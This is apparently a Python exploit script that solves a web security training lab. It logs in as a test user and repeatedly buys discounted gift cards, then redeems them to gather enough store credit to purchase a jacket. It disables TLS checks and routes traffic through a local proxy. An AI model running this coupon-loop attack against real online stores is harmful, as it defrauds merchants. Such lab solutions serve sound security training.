import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def buy_jacket(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) Logging in as the wiener user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user...")

        for i in range(500):
            # Add gift card to cart
            cart_url = url + "/cart"
            add_gift_card = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
            r = s.post(cart_url, data=add_gift_card, verify=False, proxies=proxies)

            # Redeem the coupon
            redeem_coupon_url = url + "/cart/coupon"
            csrf_token = get_csrf_token(s, cart_url)
            redeem_coupon = {"csrf": csrf_token, "coupon": "SIGNUP30"}
            r = s.post(redeem_coupon_url, data=redeem_coupon, verify=False, proxies=proxies)

            # Purchase the gift card
            purchase_item_url = url + "/cart/checkout"
            csrf_token = get_csrf_token(s, cart_url)
            purchase_coupon = {"csrf": csrf_token}
            r = s.post(purchase_item_url, data=purchase_coupon, verify=False, proxies=proxies)

            # Extract gift card code from order confirmation
            soup = BeautifulSoup(r.text, 'html.parser')
            code_table = soup.find('table', {'class': 'is-table-numbers'})
            if code_table:
                gift_card_code = code_table.find('td').text.strip()
                print(f"(+) Extracted gift card code: {gift_card_code}")
            else:
                print("(-) Failed to extract gift card code")
                sys.exit(-1)

            # Apply gift card to account
            apply_gift_card_url = url + "/gift-card"
            csrf_token = get_csrf_token(s, url + "/my-account")
            apply_gift_card = {"csrf": csrf_token, "gift-card": gift_card_code}
            r = s.post(apply_gift_card_url, data=apply_gift_card, verify=False, proxies=proxies)
            if r.status_code != 200:
                print("(-) Failed to apply gift card")
                sys.exit(-1)

        # Add jacket to cart
        cart_url = url + "/cart"
        add_jacket = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
        r = s.post(cart_url, data=add_jacket, verify=False, proxies=proxies)

        # Purchase jacket
        csrf_token = get_csrf_token(s, cart_url)
        purchase_item_url = url + "/cart/checkout"
        purchase_jacket = {"csrf": csrf_token}
        r = s.post(purchase_item_url, data=purchase_jacket, verify=False, proxies=proxies)

        if 'Congratulations' in r.text:
            print("(+) Successfully completed the exercise.")
        else:
            print("(-) Exploit failed.")
            sys.exit(-1)

    else:
        print("(-) Could not login as user.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    buy_jacket(s, url)


if __name__ == "__main__":
    main()
